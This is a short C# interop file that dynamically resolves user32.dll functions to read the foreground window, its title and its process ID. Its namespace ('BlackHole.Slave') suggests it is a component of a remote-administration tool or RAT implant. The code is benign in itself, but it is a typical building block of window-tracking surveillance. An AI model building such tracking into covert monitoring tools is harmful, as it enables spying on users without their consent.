using System;
using System.Runtime.InteropServices;
using System.Text;

namespace BlackHole.Slave.Helper.Native.Impl
{
    public sealed class User32 : DynamicNativeLibrary<User32>
    {
        public User32() : base("user32.dll") { }

        [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
        public delegate IntPtr dGetForegroundWindow();

        [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
        public delegate int dGetWindowThreadProcessId(IntPtr handle, out int processId);

        [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
        public delegate int dGetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        public static dGetWindowText GetWindowText = 
            Instance.FindUmanagedFunction<dGetWindowText>("GetWindowTextW");

        public static dGetWindowThreadProcessId GetWindowThreadProcessId = 
            Instance.FindUmanagedFunction<dGetWindowThreadProcessId>("GetWindowThreadProcessId");

        public static dGetForegroundWindow GetForegroundWindow = 
            Instance.FindUmanagedFunction<dGetForegroundWindow>("GetForegroundWindow");
    }
}
